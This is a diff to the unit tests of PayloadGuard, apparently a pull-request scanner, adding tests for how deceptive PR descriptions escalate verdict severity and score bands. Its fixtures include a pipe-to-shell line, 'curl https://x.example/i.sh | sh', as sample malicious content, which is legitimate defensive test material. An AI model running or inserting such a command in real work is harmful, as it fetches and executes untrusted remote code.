@@ -21,6 +21,9 @@ from analyze import (
     SemanticTransparencyAnalyzer,
     StructuralPayloadAnalyzer,
     TemporalDriftAnalyzer,
+    _DECEPTION_RECOMMENDATIONS,
+    _VERDICT_BANDS,
+    _apply_semantic_transparency,
     _check_agent_settings_json,
     _check_binding_gyp,
     _check_composer_json,
@@ -33,7 +36,9 @@ from analyze import (
     _is_oidc_consumer_typosquatted,
     _load_allowlist,
     _parse_added_packages,
+    _raise_verdict,
     _read_file_at_ref,
+    format_markdown_report,
     load_config,
     print_report,
     save_json_report,
@@ -511,31 +516,41 @@ class TestBranchAgeCannotDecideDestructive(unittest.TestCase):
                     self.assertNotEqual(aged["status"], "DESTRUCTIVE", case)
 
 
+_DECEPTIVE_SEMANTIC = {"status": "DECEPTIVE_PAYLOAD", "is_deceptive": True, "mci_score": 0.7,
+                       "signals": ["scope_understated", "operation_mutation"],
+                       "directive": "❌ DO NOT MERGE. PR description is inconsistent with actual diff scope and structure."}
+
+
+def _analyze_added_files(added_files, days_old=0, pr_description="minor typo", semantic=None):
+    """Run analyze() on a mocked repository whose branch adds ``added_files`` ((path, text) pairs)
+    and is ``days_old`` days older than the target; ``semantic`` replaces the L5b result when given."""
+    branch_date = datetime(2025, 1, 1, tzinfo=timezone.utc)
+    a = _make_analyzer()
+    branch_commit = MagicMock(committed_datetime=branch_date, hexsha="aabbccddeeff")
+    target_commit = MagicMock(committed_datetime=branch_date + timedelta(days=days_old), hexsha="112233445566")
+    a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
+    a.repo.iter_commits.return_value = []
+    diffs = []
+    for path, text in added_files:
+        d = MagicMock(change_type="A", b_path=path)
+        d.b_blob.data_stream.read.return_value = text.encode("utf-8")
+        diffs.append(d)
+    merge_base_commit = MagicMock(hexsha="deadbeef00000000")
+    merge_base_commit.diff.return_value = diffs
+    a.repo.merge_base.return_value = [merge_base_commit]
+    a.repo.git.diff.return_value = "\n".join(f"1\t0\t{path}" for path, _ in added_files)
+    if semantic is None:
+        return a.analyze(pr_description=pr_description)
+    with patch.object(SemanticTransparencyAnalyzer, "analyze_transparency", return_value=dict(semantic)):
+        return a.analyze(pr_description=pr_description)
+
+
 class TestBranchAgeSemanticEscalation(unittest.TestCase):
     """AUDIT_LOG §H1: a deceptive description escalates CAUTION to DESTRUCTIVE only when the
     content evidence reaches CAUTION, not when branch age does."""
 
-    _DECEPTIVE = {"status": "DECEPTIVE_PAYLOAD", "mci_score": 0.7,
-                  "signals": ["scope_understated", "operation_mutation"]}
-
     def _verdict(self, added_files, days_old):
-        branch_date = datetime(2025, 1, 1, tzinfo=timezone.utc)
-        a = _make_analyzer()
-        branch_commit = MagicMock(committed_datetime=branch_date, hexsha="aabbccddeeff")
-        target_commit = MagicMock(committed_datetime=branch_date + timedelta(days=days_old), hexsha="112233445566")
-        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
-        a.repo.iter_commits.return_value = []
-        diffs = []
-        for path, text in added_files:
-            d = MagicMock(change_type="A", b_path=path)
-            d.b_blob.data_stream.read.return_value = text.encode("utf-8")
-            diffs.append(d)
-        merge_base_commit = MagicMock(hexsha="deadbeef00000000")
-        merge_base_commit.diff.return_value = diffs
-        a.repo.merge_base.return_value = [merge_base_commit]
-        a.repo.git.diff.return_value = "\n".join(f"1\t0\t{path}" for path, _ in added_files)
-        with patch.object(SemanticTransparencyAnalyzer, "analyze_transparency", return_value=dict(self._DECEPTIVE)):
-            result = a.analyze(pr_description="minor typo")
+        result = _analyze_added_files(added_files, days_old, semantic=_DECEPTIVE_SEMANTIC)
         self.assertNotIn("error", result)
         return result["verdict"]
 
@@ -550,6 +565,133 @@ class TestBranchAgeSemanticEscalation(unittest.TestCase):
         shell = "curl https://x.example/i.sh | sh\n"
         v = self._verdict([("notes.txt", shell), ("setup.txt", shell)], days_old=0)
         self.assertEqual(v["status"], "DESTRUCTIVE")
+
+
+class TestEscalatedVerdictFields(unittest.TestCase):
+    """AUDIT_LOG §V12: a verdict raised after L3 (consequence policy, L5b) carries the severity,
+    score band and recommendation of its new status; escalation_score records the points added."""
+
+    _ORDER = ("SAFE", "REVIEW", "CAUTION", "DESTRUCTIVE")
+    _SHELL = "curl https://x.example/i.sh | sh\n"
+
+    def _fields(self, v):
+        return v["status"], v["severity"], v["severity_score"], v["escalation_score"]
+
+    def test_l3_fields_keep_their_values(self):
+        # _assess_consequence reads severity and recommendation from _VERDICT_BANDS; these are
+        # the literals it returned before.
+        a = _make_analyzer()
+        verdicts = {
+            "SAFE": a._assess_consequence(0, 0, 0, 0),
+            "REVIEW": a._assess_consequence(0, 0, 91, 0),
+            "CAUTION": a._assess_consequence(0, 0, 0, 0, actions_poisoning_flags=1),
+            "DESTRUCTIVE": a._assess_consequence(0, 0, 0, 0, security_file_deletions=1),
+        }
+        expected = {
+            "SAFE": ("LOW", "✓ Proceed with normal review process"),
+            "REVIEW": ("MEDIUM", "→ Proceed with normal review process, but note the flags above"),
+            "CAUTION": ("HIGH", "⚠️  REVIEW CAREFULLY — Significant destructive changes detected"),
+            "DESTRUCTIVE": ("CRITICAL", "❌ DO NOT MERGE — This would catastrophically alter the codebase"),
+        }
+        for status, v in verdicts.items():
+            self.assertEqual((v["status"], v["severity"], v["recommendation"], v["escalation_score"]),
+                             (status, *expected[status], 0))
+        self.assertEqual(verdicts["SAFE"]["flags"], ["No major red flags detected"])
+
+    def test_raise_lifts_score_to_lowest_score_of_new_band(self):
+        v = _make_analyzer()._assess_consequence(0, 0, 0, 0)
+        _raise_verdict(v, "REVIEW")
+        self.assertEqual(self._fields(v), ("REVIEW", "MEDIUM", 1, 1))
+        self.assertEqual(v["recommendation"], _VERDICT_BANDS["REVIEW"][2])
+        _raise_verdict(v, "DESTRUCTIVE", "custom")
+        self.assertEqual(self._fields(v), ("DESTRUCTIVE", "CRITICAL", 5, 5))
+        self.assertEqual(v["recommendation"], "custom")
+
+    def test_raise_keeps_a_score_already_in_band(self):
+        # Security (+5) and critical-path (+2) deletions score 7.
+        v = _make_analyzer()._assess_consequence(0, 0, 0, 0, security_file_deletions=1, critical_file_deletions=1)
+        _raise_verdict(v, "DESTRUCTIVE", "custom")
+        self.assertEqual(self._fields(v), ("DESTRUCTIVE", "CRITICAL", 7, 0))
+
+    def test_deception_on_clean_change_reports_caution(self):
+        # Before §V12: CAUTION with severity LOW, score 0 and "✓ Proceed with normal review process".
+        report = _analyze_added_files([("README.md", "# Hello\n")], semantic=_DECEPTIVE_SEMANTIC)
+        v = report["verdict"]
+        self.assertEqual(self._fields(v), ("CAUTION", "HIGH", 3, 3))
+        self.assertEqual(v["recommendation"], _DECEPTION_RECOMMENDATIONS["CAUTION"])
+        self.assertIn("PayloadGuard — `CAUTION` [HIGH]", format_markdown_report(report))
+
+    def test_deception_on_content_caution_reports_destructive(self):
+        # Before §V12: DESTRUCTIVE (exit 2) with severity HIGH, score 4 and "REVIEW CAREFULLY".
+        report = _analyze_added_files([("notes.txt", self._SHELL), ("setup.txt", self._SHELL)],
+                                      semantic=_DECEPTIVE_SEMANTIC)
+        v = report["verdict"]
+        self.assertEqual(self._fields(v), ("DESTRUCTIVE", "CRITICAL", 5, 1))
+        self.assertEqual(v["recommendation"], _DECEPTION_RECOMMENDATIONS["DESTRUCTIVE"])
+        self.assertIn("PayloadGuard — `DESTRUCTIVE` [CRITICAL]", format_markdown_report(report))
+
+    def test_missing_description_reports_review(self):
+        # Before §V12: REVIEW with severity LOW and score 0.
+        v = _analyze_added_files([("README.md", "# Hello\n")], pr_description="")["verdict"]
+        self.assertEqual(self._fields(v), ("REVIEW", "MEDIUM", 1, 1))
+        self.assertEqual(v["recommendation"], _VERDICT_BANDS["REVIEW"][2])
+
+    def test_deception_on_age_only_caution_keeps_status_and_score(self):
+        # §H1 keeps an age-only CAUTION at CAUTION; only the recommendation names the deception.
+        v = _analyze_added_files([("README.md", "# Hello\n")], days_old=400, semantic=_DECEPTIVE_SEMANTIC)["verdict"]
+        self.assertEqual(self._fields(v), ("CAUTION", "HIGH", 3, 0))
+        self.assertEqual(v["branch_age_score"], 3)
+        self.assertEqual(v["recommendation"], _DECEPTION_RECOMMENDATIONS["CAUTION"])
+
+    def test_semantic_escalation_across_signal_grid(self):
+        """Every L3 verdict on the §H1 signal grid, at each branch age tier, under each L5b status:
+        the final verdict matches the reference escalation, its score lies in its status band, and
+        severity_score = L3 score + escalation_score."""
+        a = _make_analyzer()
+        signal_tiers = itertools.product(
+            (0, 21, 51),                                                 # files_deleted
+            ((0, 0), (150, 60), (150, 95), (10001, 0), (50001, 95)),     # (lines_deleted, deletion_ratio)
+            ("LOW", "CRITICAL"),                                         # structural_severity
+            (0, 1),                                                      # critical_file_deletions
+            (0, 1),                                                      # security_file_deletions
+            (0, 1),                                                      # unverified_dependencies
+            (0, 1, 2),                                                   # content_flags
+            ((0, False), (1, False), (1, True)),                         # Actions poisoning
+            ((0, False), (1, False), (1, True)),                         # AI config poisoning
+        )
+        semantics = [{"status": s, "signals": ["scope_understated"]}
+                     for s in ("TRANSPARENT", "UNVERIFIED", "CAUTION_MISMATCH", "DECEPTIVE_PAYLOAD")]
+        for files, (lines, ratio), structural, crit, sec, unv, cf, (af, ac), (aif, aic) in signal_tiers:
+            kwargs = dict(
+                structural_severity=structural, critical_file_deletions=crit, security_file_deletions=sec,
+                unverified_dependencies=unv, content_flags=cf, actions_poisoning_flags=af,
+                actions_poisoning_critical=ac, ai_config_poisoning_flags=aif, ai_config_poisoning_critical=aic,
+            )
+            for days in (0, 91, 181, 366):
+                l3 = a._assess_consequence(files, lines, days, ratio, **kwargs)
+                content = l3["severity_score"] - l3["branch_age_score"]
+                for semantic in semantics:
+                    v = dict(l3, flags=list(l3["flags"]))
+                    _apply_semantic_transparency(v, semantic)
+                    case = (files, lines, ratio, days, kwargs, semantic["status"])
+                    # Reference escalation (AUDIT_LOG §H1, §V12).
+                    status, recommendation = l3["status"], l3["recommendation"]
+                    if semantic["status"] in ("UNVERIFIED", "CAUTION_MISMATCH") and status == "SAFE":
+                        status, recommendation = "REVIEW", _VERDICT_BANDS["REVIEW"][2]
+                    elif semantic["status"] == "DECEPTIVE_PAYLOAD" and status != "DESTRUCTIVE":
+                        status = "DESTRUCTIVE" if status == "CAUTION" and content >= 3 else "CAUTION"
+                        recommendation = _DECEPTION_RECOMMENDATIONS[status]
+                    score = max(l3["severity_score"], _VERDICT_BANDS[status][1])
+                    self.assertEqual(
+                        (v["status"], v["severity"], v["severity_score"], v["recommendation"]),
+                        (status, _VERDICT_BANDS[status][0], score, recommendation), case,
+                    )
+                    self.assertEqual(v["severity_score"], l3["severity_score"] + v["escalation_score"], case)
+                    self.assertEqual(v["branch_age_score"], l3["branch_age_score"], case)
+                    band = ("DESTRUCTIVE" if score >= 5 else "CAUTION" if score >= 3
+                            else "REVIEW" if score >= 1 else "SAFE")
+                    self.assertEqual(band, status, case)
+                    self.assertGreaterEqual(self._ORDER.index(status), self._ORDER.index(l3["status"]), case)
 
 
 # ==============================================================================
@@ -3499,6 +3641,25 @@ class TestPolicyReadFromTargetBranch(unittest.TestCase):
             extra_env={"PAYLOADGUARD_CONSEQUENCE_MODE": "advisory"}, tag="_env",
         )
         self.assertEqual(rep["consequence_analysis"]["mode"], "advisory")
+        self.assertEqual(code, 0)
+
+    # AUDIT_LOG §V12: a verdict raised by the consequence policy carries the fields of its new status.
+
+    def test_enforce_block_reports_destructive_fields(self):
+        _code, rep = self.results["pr/gut-verify"]
+        v = rep["verdict"]
+        self.assertEqual((v["status"], v["severity"], v["severity_score"], v["escalation_score"]),
+                         ("DESTRUCTIVE", "CRITICAL", 5, 5))
+        self.assertEqual(v["recommendation"], "❌ DO NOT MERGE — Verified destructive code consequence detected")
+
+    def test_advisory_review_carries_review_recommendation(self):
+        # Before §V12 the REVIEW verdict kept SAFE's "✓ Proceed with normal review process".
+        code, rep = self._scan("pr/gut-verify", "Tidy auth module",
+                               extra_args=("--consequence-mode", "advisory"), tag="_advisory")
+        v = rep["verdict"]
+        self.assertEqual((v["status"], v["severity"], v["severity_score"], v["escalation_score"]),
+                         ("REVIEW", "MEDIUM", 1, 1))
+        self.assertEqual(v["recommendation"], _VERDICT_BANDS["REVIEW"][2])
         self.assertEqual(code, 0)
 
     def test_load_config_ref_reads_commit_not_working_tree(self):
